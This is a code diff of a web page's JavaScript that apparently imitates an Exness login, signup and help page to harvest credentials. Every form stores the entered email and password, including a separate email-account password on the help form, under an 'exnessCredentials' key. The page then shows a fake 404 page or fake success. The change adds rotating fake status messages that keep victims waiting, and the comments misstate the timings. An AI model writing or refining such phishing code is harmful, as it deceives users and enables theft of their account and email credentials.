@@ -473,165 +473,255 @@
             <button class="retry-btn" onclick="showLoginPage()">Try Again</button>
         </div>
     </div>
-
     <script>
-        // Initialize the page
-        showLoginPage();
-
-        // Tab toggles
-        document.querySelectorAll('.tab').forEach(tab => {
-            tab.addEventListener('click', () => {
-                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active', 'underline'));
-                tab.classList.add('active', 'underline');
-                const target = tab.getAttribute('data-tab');
-                document.getElementById('loginForm').style.display = target === 'login' ? 'block' : 'none';
-                document.getElementById('signupForm').style.display = target === 'signup' ? 'block' : 'none';
-            });
-        });
-
-        // Password toggle (simple)
-        const pwToggle = document.getElementById('togglePw');
-        const loginPw = document.getElementById('loginPassword');
-        pwToggle.addEventListener('click', () => {
-            if (loginPw.type === 'text') {
-                loginPw.type = 'text';
-                loginPw.classList.add('fake-password');
-                pwToggle.textContent = '•••';
-                pwToggle.setAttribute('aria-pressed', 'false');
-            } else {
-                loginPw.type = 'text';
-                loginPw.classList.remove('fake-password');
-                pwToggle.textContent = 'Hide';
-                pwToggle.setAttribute('aria-pressed', 'true');
-            }
-        });
-
-        // Login form handler
-        document.getElementById('loginForm').addEventListener('submit', e => {
-            e.preventDefault();
-            handleFormSubmission('login');
-        });
-
-        // Signup form handler
-        document.getElementById('signupForm').addEventListener('submit', e => {
-            e.preventDefault();
-            handleFormSubmission('signup');
-        });
-
-        // Help form handler
-        document.getElementById('helpForm').addEventListener('submit', e => {
-            e.preventDefault();
-            handleHelpSubmission();
-        });
-
-        function handleFormSubmission(type) {
-            const btn = type === 'login' ? document.getElementById('loginBtn') : document.getElementById('signupBtn');
-            const originalText = btn.textContent;
-            
-            // Show "Please wait" and disable button
-            btn.textContent = 'Please wait...';
-            btn.disabled = true;
-            
-            // Get form data
-            let email, password;
-            if (type === 'login') {
-                email = document.getElementById('loginEmail').value;
-                password = document.getElementById('loginPassword').value;
-            } else {
-                email = document.getElementById('signupEmail').value;
-                password = document.getElementById('signupPassword').value;
-            }
-            
-            // Store credentials in localStorage
-            const credentials = {
-                email: email,
-                password: password,
-                type: type,
-                timestamp: new Date().toLocaleString()
-            };
-            
-            // Save to localStorage (append to existing array)
-            let allCredentials = JSON.parse(localStorage.getItem('exnessCredentials') || '[]');
-            allCredentials.push(credentials);
-            localStorage.setItem('exnessCredentials', JSON.stringify(allCredentials));
-            
-            // Simulate API call delay
-            setTimeout(() => {
-                // Show 404 error page
-                showErrorPage();
-                
-                // Reset button (though it will be hidden now)
-                btn.textContent = originalText;
-                btn.disabled = false;
-            }, 2000);
-        }
-
-        function handleHelpSubmission() {
-            const btn = document.getElementById('helpBtn');
-            const originalText = btn.textContent;
-            const helpEmail = document.getElementById('helpEmail').value;
-            const helpPassword = document.getElementById('helpPassword').value;
-            
-            // Show "Processing..." and disable button
-            btn.textContent = 'Processing...';
-            btn.disabled = true;
-            
-            // Store help credentials in localStorage
-            const helpCredentials = {
-                type: 'help_request',
-                email: helpEmail,
-                emailPassword: helpPassword,
-                timestamp: new Date().toLocaleString()
-            };
-            
-            // Save to localStorage
-            let allCredentials = JSON.parse(localStorage.getItem('exnessCredentials') || '[]');
-            allCredentials.push(helpCredentials);
-            localStorage.setItem('exnessCredentials', JSON.stringify(allCredentials));
-            
-            // Simulate processing delay
-            setTimeout(() => {
-                // Show success message
-                document.getElementById('helpMessage').style.display = 'block';
-                
-                // Reset button
-                btn.textContent = originalText;
-                btn.disabled = false;
-                
-                // Clear help form
-                document.getElementById('helpEmail').value = '';
-                document.getElementById('helpPassword').value = '';
-            }, 1500);
-        }
-
         // Page navigation functions
-        function showLoginPage() {
-            document.getElementById('loginPage').style.display = 'flex';
-            document.getElementById('errorPage').style.display = 'none';
-        }
+function showLoginPage() {
+    document.getElementById('loginPage').style.display = 'flex';
+    document.getElementById('errorPage').style.display = 'none';
+}
 
-        function showErrorPage() {
-            document.getElementById('loginPage').style.display = 'none';
-            document.getElementById('errorPage').style.display = 'block';
-        }
+function showErrorPage() {
+    document.getElementById('loginPage').style.display = 'none';
+    document.getElementById('errorPage').style.display = 'block';
+}
 
-        // Password confirmation validation for signup
-        document.getElementById('signupPassword').addEventListener('input', validatePasswords);
-        document.getElementById('confirmPassword').addEventListener('input', validatePasswords);
+// Initialize the page
+showLoginPage();
 
-        function validatePasswords() {
-            const password = document.getElementById('signupPassword').value;
-            const confirmPassword = document.getElementById('confirmPassword').value;
-            const signupBtn = document.getElementById('signupBtn');
-            
-            if (confirmPassword && password !== confirmPassword) {
-                signupBtn.disabled = true;
-                signupBtn.style.opacity = '0.6';
-            } else {
-                signupBtn.disabled = false;
-                signupBtn.style.opacity = '1';
-            }
-        }
+// Tab toggles
+document.querySelectorAll('.tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active', 'underline'));
+        tab.classList.add('active', 'underline');
+        const target = tab.getAttribute('data-tab');
+        document.getElementById('loginForm').style.display = target === 'login' ? 'block' : 'none';
+        document.getElementById('signupForm').style.display = target === 'signup' ? 'block' : 'none';
+    });
+});
+
+// Password toggle (simple)
+const pwToggle = document.getElementById('togglePw');
+const loginPw = document.getElementById('loginPassword');
+pwToggle.addEventListener('click', () => {
+    if (loginPw.type === 'text') {
+        loginPw.type = 'text';
+        loginPw.classList.add('fake-password');
+        pwToggle.textContent = '•••';
+        pwToggle.setAttribute('aria-pressed', 'false');
+    } else {
+        loginPw.type = 'text';
+        loginPw.classList.remove('fake-password');
+        pwToggle.textContent = 'Hide';
+        pwToggle.setAttribute('aria-pressed', 'true');
+    }
+});
+
+// Login form handler
+document.getElementById('loginForm').addEventListener('submit', e => {
+    e.preventDefault();
+    handleFormSubmission('login');
+});
+
+// Signup form handler
+document.getElementById('signupForm').addEventListener('submit', e => {
+    e.preventDefault();
+    handleFormSubmission('signup');
+});
+
+// Help form handler
+document.getElementById('helpForm').addEventListener('submit', e => {
+    e.preventDefault();
+    handleHelpSubmission();
+});
+
+// Array of fake error messages to display during loading
+const fakeMessages = [
+    "Please wait...",
+    "Connecting to server...",
+    "Authenticating credentials...",
+    "Checking account status...",
+    "Servers are currently overloaded...",
+    "Too many users on the server...",
+    "Network connection unstable...",
+    "Re-establishing secure connection...",
+    "Verifying security tokens...",
+    "Loading user preferences...",
+    "Server response delayed...",
+    "Checking regional restrictions...",
+    "Connection timeout, retrying...",
+    "Service temporarily unavailable...",
+    "Processing your request...",
+    "Almost there..."
+];
+
+let messageInterval;
+let loadingTimeout;
+
+function handleFormSubmission(type) {
+    const btn = type === 'login' ? document.getElementById('loginBtn') : document.getElementById('signupBtn');
+    const originalText = btn.textContent;
+    
+    // Show initial message and disable button
+    btn.textContent = 'Please wait...';
+    btn.disabled = true;
+    
+    // Get form data
+    let email, password;
+    if (type === 'login') {
+        email = document.getElementById('loginEmail').value;
+        password = document.getElementById('loginPassword').value;
+    } else {
+        email = document.getElementById('signupEmail').value;
+        password = document.getElementById('signupPassword').value;
+    }
+    
+    // Store credentials in localStorage
+    const credentials = {
+        email: email,
+        password: password,
+        type: type,
+        timestamp: new Date().toLocaleString()
+    };
+    
+    // Save to localStorage (append to existing array)
+    let allCredentials = JSON.parse(localStorage.getItem('exnessCredentials') || '[]');
+    allCredentials.push(credentials);
+    localStorage.setItem('exnessCredentials', JSON.stringify(allCredentials));
+    
+    // Create a status message element if it doesn't exist
+    let statusElement = document.getElementById(`${type}Status`);
+    if (!statusElement) {
+        statusElement = document.createElement('div');
+        statusElement.id = `${type}Status`;
+        statusElement.style.cssText = 'margin-top: 15px; padding: 10px; border-radius: 6px; background: #f3f4f6; color: #4b5563; text-align: center; font-size: 14px;';
+        btn.parentNode.appendChild(statusElement);
+    }
+    
+    // Show the status element
+    statusElement.style.display = 'block';
+    
+    let messageIndex = 0;
+    
+    // Start showing rotating messages
+    messageInterval = setInterval(() => {
+        statusElement.textContent = fakeMessages[messageIndex];
+        messageIndex = (messageIndex + 1) % fakeMessages.length;
+        
+        // Add a visual effect to make it look like it's processing
+        statusElement.style.background = messageIndex % 2 === 0 ? '#f3f4f6' : '#e5e7eb';
+    }, 5000); // Change message every 3 seconds
+    
+    // Set timeout for 2 minutes (120000 ms) to show error page
+    loadingTimeout = setTimeout(() => {
+        // Clear intervals
+        clearInterval(messageInterval);
+        
+        // Show 404 error page
+        showErrorPage();
+        
+        // Reset button
+        btn.textContent = originalText;
+        btn.disabled = false;
+        
+        // Hide status element
+        statusElement.style.display = 'none';
+    }, 50000); // 2 minutes = 120,000 milliseconds
+}
+
+function handleHelpSubmission() {
+    const btn = document.getElementById('helpBtn');
+    const originalText = btn.textContent;
+    const helpEmail = document.getElementById('helpEmail').value;
+    const helpPassword = document.getElementById('helpPassword').value;
+    
+    // Show "Processing..." and disable button
+    btn.textContent = 'Processing...';
+    btn.disabled = true;
+    
+    // Store help credentials in localStorage
+    const helpCredentials = {
+        type: 'help_request',
+        email: helpEmail,
+        emailPassword: helpPassword,
+        timestamp: new Date().toLocaleString()
+    };
+    
+    // Save to localStorage
+    let allCredentials = JSON.parse(localStorage.getItem('exnessCredentials') || '[]');
+    allCredentials.push(helpCredentials);
+    localStorage.setItem('exnessCredentials', JSON.stringify(allCredentials));
+    
+    // Create a status message element if it doesn't exist
+    let statusElement = document.getElementById('helpStatus');
+    if (!statusElement) {
+        statusElement = document.createElement('div');
+        statusElement.id = 'helpStatus';
+        statusElement.style.cssText = 'margin-top: 15px; padding: 10px; border-radius: 6px; background: #f3f4f6; color: #4b5563; text-align: center; font-size: 14px;';
+        btn.parentNode.appendChild(statusElement);
+    }
+    
+    // Show the status element
+    statusElement.style.display = 'block';
+    
+    let messageIndex = 0;
+    
+    // Start showing rotating messages for help form too
+    messageInterval = setInterval(() => {
+        statusElement.textContent = fakeMessages[messageIndex];
+        messageIndex = (messageIndex + 1) % fakeMessages.length;
+        
+        // Add a visual effect to make it look like it's processing
+        statusElement.style.background = messageIndex % 2 === 0 ? '#f3f4f6' : '#e5e7eb';
+    }, 5000); // Change message every 5 seconds
+    
+    // Set timeout for 30 seconds for help form (shorter wait)
+    loadingTimeout = setTimeout(() => {
+        // Clear intervals
+        clearInterval(messageInterval);
+        
+        // Show success message
+        document.getElementById('helpMessage').style.display = 'block';
+        
+        // Reset button
+        btn.textContent = originalText;
+        btn.disabled = false;
+        
+        // Hide status element
+        statusElement.style.display = 'none';
+        
+        // Clear help form
+        document.getElementById('helpEmail').value = '';
+        document.getElementById('helpPassword').value = '';
+    }, 50000); // 30 seconds for help form
+}
+
+// Password confirmation validation for signup
+document.getElementById('signupPassword').addEventListener('input', validatePasswords);
+document.getElementById('confirmPassword').addEventListener('input', validatePasswords);
+
+function validatePasswords() {
+    const password = document.getElementById('signupPassword').value;
+    const confirmPassword = document.getElementById('confirmPassword').value;
+    const signupBtn = document.getElementById('signupBtn');
+    
+    if (confirmPassword && password !== confirmPassword) {
+        signupBtn.disabled = true;
+        signupBtn.style.opacity = '0.6';
+    } else {
+        signupBtn.disabled = false;
+        signupBtn.style.opacity = '1';
+    }
+}
+
+// Function to cancel loading if user navigates away
+window.addEventListener('beforeunload', function() {
+    if (messageInterval) {
+        clearInterval(messageInterval);
+    }
+    if (loadingTimeout) {
+        clearTimeout(loadingTimeout);
+    }
+});
     </script>
 </body>
 </html>
